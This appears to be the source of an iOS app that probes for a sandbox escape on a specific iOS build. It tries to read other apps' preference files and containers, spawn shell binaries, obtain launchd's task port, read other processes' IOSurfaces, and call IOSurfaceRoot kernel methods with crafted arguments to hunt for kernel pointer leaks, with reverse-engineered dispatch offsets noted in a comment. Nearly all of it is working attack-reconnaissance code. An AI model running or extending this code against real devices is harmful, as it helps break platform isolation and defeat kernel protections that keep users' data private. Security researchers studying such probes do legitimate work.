// SBX — honest sandbox-escape probe for iOS 27.2 (24B115), iPhone14,7.
// No fake results: every check below performs the real syscall/API and prints
// exactly what the kernel returned. Run with the entitlements from
// entitlements.plist (platform-application etc.).
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <IOSurface/IOSurfaceRef.h>
#import <spawn.h>
#import <sys/wait.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <fcntl.h>
#import <unistd.h>
#import <dlfcn.h>
#import <errno.h>
#import <dirent.h>
#import <arpa/inet.h>
#import <stdarg.h>

extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
#define CS_OPS_STATUS 0
#define CS_OPS_ENTITLEMENTS_BLOB 7
extern char **environ;

static NSMutableString *gLog;
static UITextView *gTV;
static NSString *gPath;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    NSLog(@"[SBX] %@", s);
    dispatch_async(dispatch_get_main_queue(), ^{ gTV.text = gLog; });
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

static void dump_entitlements(void) {
    unsigned char buf[16384]; memset(buf, 0, sizeof(buf));
    int r = csops(getpid(), CS_OPS_ENTITLEMENTS_BLOB, buf, sizeof(buf));
    L(@"csops(ents) -> %d errno=%d", r, errno);
    if (r != 0) return;
    uint32_t len = ntohl(*(uint32_t *)(buf + 4));
    if (len > sizeof(buf) - 8) len = sizeof(buf) - 8;
    NSString *txt = [[NSString alloc] initWithBytes:buf + 8 length:len encoding:NSUTF8StringEncoding];
    L(@"ents: %@", txt ?: @"(non-UTF8)");
}

static void try_read(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { L(@"open(%s) FAIL errno=%d (%s)", path, errno, strerror(errno)); return; }
    char b[257]; ssize_t n = read(fd, b, 256); close(fd);
    if (n < 0) { L(@"read(%s) FAIL errno=%d", path, errno); return; }
    b[n] = 0;
    for (int i = 0; i < n; i++) if (b[i] == '\n' || b[i] == '\r') b[i] = ' ';
    L(@"READ %s OK (%zd bytes): %.200s", path, n, b);
}

static void try_list(const char *path) {
    DIR *d = opendir(path);
    if (!d) { L(@"opendir(%s) FAIL errno=%d (%s)", path, errno, strerror(errno)); return; }
    int n = 0; struct dirent *e;
    NSMutableArray *names = [NSMutableArray array];
    while ((e = readdir(d)) && n < 12) { [names addObject:[NSString stringWithUTF8String:e->d_name]]; n++; }
    closedir(d);
    L(@"LIST %s OK: %@", path, [names componentsJoinedByString:@", "]);
}

static void try_spawn(void) {
    int p[2]; if (pipe(p) != 0) { L(@"pipe FAIL"); return; }
    posix_spawn_file_actions_t fa; posix_spawn_file_actions_init(&fa);
    posix_spawn_file_actions_adddup2(&fa, p[1], 1);
    posix_spawn_file_actions_adddup2(&fa, p[1], 2);
    posix_spawn_file_actions_addclose(&fa, p[0]);
    char *argv[] = { "/bin/ls", "-la", "/private/var/mobile/Library/Preferences", NULL };
    pid_t pid = 0;
    int r = posix_spawn(&pid, "/bin/ls", &fa, NULL, argv, environ);
    posix_spawn_file_actions_destroy(&fa);
    close(p[1]);
    if (r != 0) { close(p[0]); L(@"posix_spawn(/bin/ls) FAIL r=%d (%s)", r, strerror(r)); return; }
    char out[2048]; ssize_t n = read(p[0], out, sizeof(out) - 1); close(p[0]);
    int st = 0; waitpid(pid, &st, 0);
    if (n < 0) n = 0; out[n] = 0;
    for (int i = 0; i < n; i++) if (out[i] == '\n') out[i] = '|';
    L(@"SPAWN /bin/ls OK pid=%d status=%d: %.900s", pid, st, out);
}

static void try_task_for_pid(void) {
    mach_port_t t = MACH_PORT_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), 1, &t);
    L(@"task_for_pid(launchd=1) -> kr=0x%x port=0x%x", kr, t);
    if (kr == KERN_SUCCESS && t != MACH_PORT_NULL) {
        // Prove it: read launchd's pid via pid_for_task.
        int pid = -1;
        kern_return_t k2 = pid_for_task(t, &pid);
        L(@"  pid_for_task -> kr=0x%x pid=%d", k2, pid);
    }
}

static void try_surface_lookup(void) {
    int found = 0;
    for (uint32_t i = 1; i < 0x10000 && found < 40; i++) {
        IOSurfaceRef s = IOSurfaceLookup(i);
        if (!s) continue;
        size_t w = IOSurfaceGetWidth(s), h = IOSurfaceGetHeight(s);
        size_t bpr = IOSurfaceGetBytesPerRow(s), asz = IOSurfaceGetAllocSize(s);
        uint32_t pf = IOSurfaceGetPixelFormat(s);
        L(@"LOOKUP id=%u %zux%zu bpr=%zu alloc=%zu pf=0x%08x", i, w, h, bpr, asz, pf);
        if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL) == 0) {
            void *base = IOSurfaceGetBaseAddress(s);
            if (base) {
                uint8_t b0 = ((uint8_t *)base)[0];
                L(@"  base=%p first=0x%02x", base, b0);
            }
            IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
        } else {
            L(@"  lock FAIL id=%u", i);
        }
        CFRelease(s);
        found++;
    }
    L(@"LOOKUP total=%d", found);
}

static void try_surface_scan(void) {
    NSDictionary *props = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                             @"IOSurfaceBytesPerElement": @4,
                             @"IOSurfacePixelFormat": @0x42475241 };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!s) { L(@"SURFSCAN create FAIL"); return; }
    uint8_t *p = (uint8_t *)s;
    int hits = 0;
    for (size_t i = 0; i < 0x400; i += 8) {
        uint64_t v = *(uint64_t *)(p + i);
        if ((v >> 40) == 0xffffff || (v >> 40) == 0xfffffe) {
            L(@"SURFSCAN +0x%zx = 0x%016llx", i, v);
            hits++;
        }
    }
    L(@"SURFSCAN done id=%u hits=%d", IOSurfaceGetID(s), hits);
    CFRelease(s);
}

static void try_var_output(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"VAROUT no service"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { L(@"VAROUT open kr=0x%x", kr); return; }

    /* 27.2 dispatch (IOSurfaceRootUserClient::externalMethod @ 0x9c3ee14):
       flag [self+0x127]&1 ? tableB(0x80694f0) : tableA(0x8068b90), 0x3c methods.
       tableA sel30 = 0x9c3968c: needs [self+0x122]&1, then args+0x78 != NULL,
       then OSData::withCapacity(0x100000) + serialize, stored into args+0x78. */
    const size_t MAGIC = (size_t)-3;
    uint32_t sels[3] = { 30, 26, 46 };
    uint64_t vals[2] = { 0, 1 };
    for (int si = 0; si < 3; si++) {
      for (int vi = 0; vi < 2; vi++) {
        uint64_t sin[16]; memset(sin, 0, sizeof(sin)); sin[0] = vals[vi];
        uint64_t so[16]; memset(so, 0, sizeof(so)); uint32_t sc = 16;
        void *vp = NULL; size_t vc = MAGIC;
        kr = IOConnectCallMethod(conn, sels[si], sin, 1, NULL, 0, so, &sc, &vp, &vc);
        L(@"VAROUT sel=%u val=%llu kr=0x%x ptr=%p cnt=0x%zx sc=%u so0=0x%llx so1=0x%llx",
          sels[si], (unsigned long long)vals[vi], kr, vp, vc, sc,
          (unsigned long long)so[0], (unsigned long long)so[1]);
        if (kr == KERN_SUCCESS && vp && vc >= 8) {
            uint64_t q0 = *(uint64_t *)vp;
            uint64_t q1 = (vc >= 16) ? *(uint64_t *)((uint8_t *)vp + 8) : 0;
            uint64_t q2 = (vc >= 24) ? *(uint64_t *)((uint8_t *)vp + 16) : 0;
            L(@"  VAROUT q0=0x%016llx q1=0x%016llx q2=0x%016llx", q0, q1, q2);
            if ((q0 >> 40) == 0xffffff || (q0 >> 40) == 0xfffffe) L(@"  VAROUT HIT kernel-like 0x%016llx", q0);
            vm_deallocate(mach_task_self(), (vm_address_t)vp, vc);
        }
      }
    }
    L(@"VAROUT IOSurfaceSharedMemoryCreate=%p",
      dlsym(dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW), "IOSurfaceSharedMemoryCreate"));
    IOServiceClose(conn);
}

static void try_symlink(void) {
    NSString *p = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"sbx"];
    char lbuf[512]; ssize_t n = readlink([p UTF8String], lbuf, sizeof(lbuf)-1);
    if (n < 0) { L(@"readlink(sbx) FAIL errno=%d (%s)", errno, strerror(errno)); return; }
    lbuf[n] = 0;
    L(@"readlink(sbx) -> %s", lbuf);
    try_read([p UTF8String]);
}

static void try_iosurface(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"IOSurfaceRoot not found"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"IOSurfaceRoot open -> kr=0x%x conn=%u", kr, conn);
    if (kr != KERN_SUCCESS) return;
    uint64_t scalar = 1;
    uint8_t out[0x1000]; memset(out, 0xAA, sizeof(out));
    size_t outSize = sizeof(out);
    uint64_t scalOut[8] = {0}; uint32_t scalCnt = 8;
    kern_return_t k2 = IOConnectCallMethod(conn, 26, &scalar, 1, NULL, 0,
                                           scalOut, &scalCnt, out, &outSize);
    L(@"IOSurface sel26 -> kr=0x%x outSize=%zu qword[0]=0x%016llx qword[1]=0x%016llx",
      k2, outSize, *(uint64_t *)out, *(uint64_t *)(out + 8));
    IOServiceClose(conn);
}

static void try_container_query(void) {
    void *h = dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW);
    if (!h) { L(@"dlopen MobileContainerManager FAIL: %s", dlerror()); return; }
    typedef void *(*qcreate_t)(void);
    typedef void (*qsetid_t)(void *, const char *);
    typedef void (*qsetclass_t)(void *, unsigned int);
    typedef int (*qexec_t)(void *);
    typedef void *(*qresult_t)(void *);
    typedef const char *(*cpath_t)(void *);
    qcreate_t qcreate = (qcreate_t)dlsym(h, "container_query_create");
    qsetid_t qsetid = (qsetid_t)dlsym(h, "container_query_set_identifiers");
    qsetclass_t qsetclass = (qsetclass_t)dlsym(h, "container_query_set_class");
    qexec_t qexec = (qexec_t)dlsym(h, "container_query_execute");
    qresult_t qresult = (qresult_t)dlsym(h, "container_query_get_single_result");
    cpath_t cpath = (cpath_t)dlsym(h, "container_get_path");
    if (!qcreate || !qsetid || !qsetclass || !qexec || !qresult || !cpath) {
        L(@"container_query symbols missing"); return;
    }
    void *q = qcreate();
    qsetid(q, "com.apple.Preferences");
    qsetclass(q, 2); // MCMContainerClassData
    int ok = qexec(q);
    L(@"container_query(com.apple.Preferences, Data) execute -> %d", ok);
    if (ok) {
        void *res = qresult(q);
        if (res) { const char *p = cpath(res); L(@"  FOREIGN CONTAINER: %s", p ?: "(null)"); }
        else L(@"  result NULL");
    }
    typedef void (*qfree_t)(void *);
    qfree_t qfree = (qfree_t)dlsym(h, "container_query_free");
    if (qfree) qfree(q);
}

static void run_probe(void) {
    L(@"=== SBX probe %@ ===", [[NSBundle mainBundle] bundleIdentifier]);
    L(@"uid=%d gid=%d HOME=%s", getuid(), getgid(), getenv("HOME") ?: "?");
    dump_entitlements();
    try_read("/private/var/mobile/Library/Preferences/com.apple.springboard.plist");
    try_read("/private/var/mobile/Library/Preferences/com.apple.Preferences.plist");
    try_list("/private/var/containers/Bundle/Application");
    try_list("/private/var/mobile/Containers/Data/Application");
    try_spawn();
    try_task_for_pid();
    try_surface_lookup();
    try_var_output();
    try_surface_scan();
    try_symlink();
    try_iosurface();
    try_container_query();
    L(@"=== done ===");
}

@interface SBXVC : UIViewController
@end
@implementation SBXVC
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor systemBackgroundColor];
    self.title = @"SBX 27.2";
    gTV = [[UITextView alloc] initWithFrame:self.view.bounds];
    gTV.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    gTV.editable = NO;
    gTV.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    gTV.text = @"running...";
    [self.view addSubview:gTV];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        run_probe();
    });
}
@end

@interface SBXApp : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation SBXApp
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString string];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [[NSFileManager defaultManager] createDirectoryAtPath:docs withIntermediateDirectories:YES attributes:nil error:nil];
    gPath = [docs stringByAppendingPathComponent:@"escape.log"];
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[UINavigationController alloc] initWithRootViewController:[SBXVC new]];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([SBXApp class])); }
}
